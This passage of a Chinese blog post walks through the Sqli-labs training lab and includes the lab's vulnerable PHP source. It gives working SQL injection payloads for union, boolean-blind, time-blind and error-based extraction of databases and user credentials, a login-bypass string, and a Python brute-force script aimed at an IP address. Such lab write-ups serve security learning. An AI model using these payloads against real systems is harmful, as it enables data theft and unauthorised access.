给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。 CHARACTER_SETS（字符集） 提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。 … … 在注入的过程中，我们常用的是information_schema.tables下面的table_name以及table_schema表名及其所在的数据库名字。使用information_schema.columns下的column_name获取列名 select 的其他用法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667mysql&gt; select 1;+---+| 1 |+---+| 1 |+---+1 row in set (0.00 sec)mysql&gt; select 1,2,3;+---+---+---+| 1 | 2 | 3 |+---+---+---+| 1 | 2 | 3 |+---+---+---+1 row in set (0.00 sec)mysql&gt; select (1&gt;2);+-------+| (1&gt;2) |+-------+| 0 |+-------+1 row in set (0.00 sec)mysql&gt; select (1&lt;2);+-------+| (1&lt;2) |+-------+| 1 |+-------+1 row in set (0.00 sec)mysql&gt; select &quot;aaaa&quot;;+------+| aaaa |+------+| aaaa |+------+1 row in set (0.00 sec)mysql&gt; select (1&lt;2) from users;+-------+| (1&lt;2) |+-------+| 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 |+-------+13 rows in set (0.00 sec)mysql&gt; select (version());+-------------------------+| (version()) |+-------------------------+| 5.5.44-0ubuntu0.14.04.1 |+-------------------------+1 row in set (0.00 sec) SQL 注入常用函数字符拼接1. concat()函数 功能：将多个字符串连接成一个字符串。 语法：concat(str1, str2,…) 说明：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。 123456789101112131415161718mysql&gt; select concat('a','b','c') -&gt; ;+---------------------+| concat('a','b','c') |+---------------------+| abc |+---------------------+1 row in set (0.00 sec)mysql&gt; select concat('a','b','c','null') -&gt; ;+----------------------------+| concat('a','b','c','null') |+----------------------------+| abcnull |+----------------------------+1 row in set (0.00 sec) 2. concat_ws()函数 功能 和concat()一样，但是可以指定分隔符 语法：concat_ws(separator, str1, str2, …) 第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。 12345678mysql&gt; select concat_ws('#','a','b','c','null') -&gt; ;+-----------------------------------+| concat_ws('#','a','b','c','null') |+-----------------------------------+| a#b#c#null |+-----------------------------------+1 row in set (0.00 sec) 3.group_concat()函数 功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator] ) 12345678mysql&gt; select 1,(select group_concat(username) from users); +---+---------------------------------------------------------------------------------------------+| 1 | (select group_concat(username) from users) |+---+---------------------------------------------------------------------------------------------+| 1 | Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 |+---+---------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 盲注常用1.ascii()函数都会用，不说了 2.substr()函数 substr(str,pos,len);//str:字符串，pos：起始位置，len：截断长度 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647mysql&gt; select substr(&quot;abcdefg&quot;,1,1);+-----------------------+| substr(&quot;abcdefg&quot;,1,1) |+-----------------------+| a |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,1,3);+-----------------------+| substr(&quot;abcdefg&quot;,1,3) |+-----------------------+| abc |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,2,3);+-----------------------+| substr(&quot;abcdefg&quot;,2,3) |+-----------------------+| bcd |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-2,3);+------------------------+| substr(&quot;abcdefg&quot;,-2,3) |+------------------------+| fg |+------------------------+1 row in set (0.01 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-2,1);+------------------------+| substr(&quot;abcdefg&quot;,-2,1) |+------------------------+| f |+------------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-3,2);+------------------------+| substr(&quot;abcdefg&quot;,-3,2) |+------------------------+| ef |+------------------------+1 row in set (0.00 sec) sleep()都会，不说了 报错注入常用updatexml()extractvalue()group by报错注入0x02 SQL注入靶场–Sqli-labsLess-1 | 显错注入判断注入点为字符型还是数字型: ?id=1 id=2 id=1+1 这里可以发现，没有对我们输入的1+1进行运算,可以确定是字符型注入。查看源代码 1$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;; 这里有个令人异或的地方:?id=1+1为啥返回了?id=1的结果，这里进mysql控制台里面康康。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061mysql&gt; select * from users where id='1+1';+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select * from users where id=1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=&quot;1&quot;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=&quot;1a&quot;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select * from users where id=&quot;a1&quot;;Empty set (0.00 sec)mysql&gt; select * from users where id=&quot;0x1&quot;;Empty set (0.00 sec)mysql&gt; select * from users where id=0x1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=+0b01;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=+ 0b01;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec) 这宛如PHP一样强大的鲁棒性，我已经有不好的预感了。 众所周知，方便程序员写代码 = 方便黑客进来搞事情。 更深入的测试联合注入: ?id=1’ union select 1,2,3 –+ 实际执行的是，这里--+是将后面的内容注释掉了 SELECT * FROM users WHERE id=’1’ union select 1,2,3 –+ LIMIT 0,1 好像啥都没变，不过在后端的代码里可以看见相关的逻辑 12345678if($row) { echo &quot;&lt;font size='5' color= '#99FF00'&gt;&quot;; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&quot;; } MySQL返回的是 1234567+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb || 1 | 2 | 3 |+----+----------+----------+2 rows in set (0.00 sec) 但因为后端代码的设计，只能显示第一条，这时候我们可以让前面id指向一个不存在的数据,这样第一条数据就只会返回空 1234567mysql&gt; SELECT * FROM users WHERE id='-1' union select 1,2,3; +----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 2 | 3 |+----+----------+----------+1 row in set (0.00 sec) 开始爆金币数据了 ?id=-1’ union select 1,(select username from users limit 4,1),3 –+ 因为select username from users会返回多条数据，这时候使用limit来限制返回哪一行 这样子爆破数据不够爽，还得手动一个一个搓，太麻烦了,直接上group_concat() ?id=-1’ union select 1,(select group_concat(username) from users),3 –+ 不过这是咱在翻看了源代码，并且知道这些数据的情况下做出来的，在真正注入的环境下，得需要获取这些数据，这时候就需要information_schema这个数据库了 ?id=-1’ union select 1,(select group_concat(schema_name) from schemata),3 –+ 发生什么事了？好像有点不太对劲呢。因为这题所在的数据库是security，而schemata是在information_schema这个数据库下面的。我们需要换成information_schema.schemata ?id=-1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+ 数据库爆出来了，爆表名 ?id=-1’ union select 1,(select group_concat(table_name) from information_schema.columns where table_schema=”security”),3 –+ 表名出来了，爆字段 ?id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=”users”),3 –+ 需要的数据都有了，咱可以直接把库给脱下来了 Less-2 - Less-4这几题都一样，无非是注入点周围包裹的东西不一样，不多赘述，过。 Less-5 | 布尔盲注 ?id=1 眉清目秀，啥都木有。 ?id=1”‘一通测试下来，发现有了报错信息 如何利用报错信息注入呢？ ?id=1’ and 1 = 1 –+i ?id=2’ and 2 = 1 –+ 那有意思的就来了，嘻嘻 12345678mysql&gt; select ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0);+-----------------------------------------------------------------------------------------------------+| ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0) |+-----------------------------------------------------------------------------------------------------+| 1 |+-----------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 爆数据库 1234567891011121314import requestsurl = &quot;http://39.104.82.167/Less-5/?id=&quot;res = &quot;&quot;for i in range(0,256): for j in range(0,256): for k in range(0,256): payload = f&quot;1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),{j},1)) = {k} --+&quot; r = requests.get(url+payload) if &quot;You are in...........&quot; in r.text: res += chr(k) print(res) break 更改payload来爆表 1payload = f&quot;1' and ascii(substr((select group_concat(table_name) from information_schema.columns where table_schema=\\&quot;security\\&quot;),{j},1)) = {k} --+&quot; 更改payload 来爆字段 1payload = f&quot;1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),{j},1)) = {k} --+&quot; Tips 无AND的情况下，可以用^ Less 6-8 都差不多，就是需要各种奇妙的闭合略 Less 9这里需要时间盲注，和布尔盲注差不多只是需要添加一个if(a,sleep(10),1)判断 ?id=1’ and if(1=1,sleep(5),1)–+ 判断参数构造。 ?id=1’and if(length((select database()))&gt;9,sleep(5),1)–+ 判断数据库名长度 ?id=1’and if(ascii(substr((select database()),1,1))=115,sleep(5),1)–+ 逐一判断数据库字符 ?id=1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)–+ 判断所有表名长度 ?id=1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)–+ 逐一判断表名 ?id=1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’))&gt;20,sleep(5),1)–+ 判断所有字段名的长度 ?id=1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’),1,1))&gt;99,sleep(5),1)–+ 逐一判断字段名。 ?id=1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+ 判断字段内容长度 ?id=1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+ 逐一检测内容。 Less 10 一模一样，略Less 11 | 万能密码这次开始，不是get传参了，换成POST传参还给了个登录框，先随便穿个数据康康 这时候拿出我们的究极无敌炫酷万能密码1' or 1=1# 好了，这就进去了 为什么呢？咱把源码翻开 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])){ $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname); fwrite($fp,'Password:'.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;; $result=mysql_query($sql); //注意这里 $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= &quot;#0000ff&quot;&gt;'; echo &quot;&lt;br&gt;&quot;; echo '&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;'; //echo &quot; You Have successfully logged in\\n\\n &quot; ; echo '&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;'; echo &quot;&lt;br&gt;&quot;; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo 'Your Password:' .$row['password']; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo '&lt;img src=&quot;../images/flag.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;'; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo '&lt;img src=&quot;../images/slap.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; }}?&gt; 关键点在这里$result=mysql_query($sql); 这里的结果是用sql语句的查询结果来，所以只需要让语句返回一个真就行了，or 1 = 1使得整个语句恒真，这就让我们成功登陆进去了 之后我们就可以注入获取信息了。 Less 12 -16 都差不多略 Less 17 | 报错注入这题开始不同了，使用的是update而不是select 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;'&quot; . mysql_real_escape_string($value) . &quot;'&quot;; } else { $value = intval($value); } return $value; }// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])){//making sure uname is not injectable$uname=check_input($_POST['uname']); $passwd=$_POST['passwd'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'User Name:'.$uname.&quot;\\n&quot;);fwrite($fp,'New Password:'.$passwd.&quot;\\n&quot;);fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);//echo $row; if($row) { //echo '&lt;font color= &quot;#0000ff&quot;&gt;'; $row1 = $row['username']; //echo 'Your Login name:'. $row1; $update=&quot;UPDATE users SET password = '$passwd' WHERE username='$row1'&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; if (mysql_error()) { echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;'; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;'; //echo &quot; You password has been successfully updated &quot; ; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } echo '&lt;img src=&quot;../images/flag1.jpg&quot; /&gt;'; //echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;'; //echo &quot;Bug off you Silly Dumb hacker&quot;; echo &quot;&lt;/br&gt;&quot;; echo '&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; }} 报错注入开淦 能进行报错的函数extractvalue() 演示: 12345mysql&gt; select extractvalue(1,concat(0x5c,&quot;114514&quot;,0x5c));ERROR 1105 (HY000): XPATH syntax error: '\\114514\\'``` * payload: 1’ and (extractvalue(1,concat(0x5c,version(),0x5c)))# 爆版本 1’ and (extractvalue(1,concat(0x5c,database(),0x5c)))# 爆数据库 1’ and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))# 爆表名 1’ and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’),0x5c)))# 爆字段名 1’ and (extractvalue(1,concat(0x5c,(select password from (select password from users where username=’admin1’) b) ,0x5c)))# 爆字段内容该格式针对mysql数据库。 1’ and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))# 爆字段内容。 1234567#### updatexml()* `updatexml()`是一个使用不同的xml标记匹配和替换xml块的函数。* 语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据* updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax） mysql&gt; select (updatexml(1,concat(0x7e,(version()),0x7e),1));ERROR 1105 (HY000): XPATH syntax error: ‘5.5.44-0ubuntu0.14.04.1‘ 公式: updatexml(数字,带有'~'的任何东西,数字) updatexml(数字,(concat(0x7e,(长度不过63的任意字符),0x7e)),数字) ## less 18 - Less19 地点不一样，懒得弄了. ## Less20 - Less23 base64编码了一下，还是一样 ## Less24 | 二次注入","link":"/2022/10/06/sql/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"WEB","slug":"WEB","link":"/tags/WEB/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Troubleshooting","slug":"Troubleshooting","link":"/tags/Troubleshooting/"},{"name":"ETH","slug":"ETH","link":"/tags/ETH/"},{"name":"Solidity","slug":"Solidity","link":"/tags/Solidity/"},{"name":"upload","slug":"upload","link":"/tags/upload/"},{"name":"复现","slug":"复现","link":"/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"phar","slug":"phar","link":"/tags/phar/"},{"name":"Blockchain","slug":"Blockchain","link":"/tags/Blockchain/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"inject","slug":"inject","link":"/tags/inject/"}],"categories":[{"name":"SQL","slug":"SQL","link":"/categories/SQL/"}]}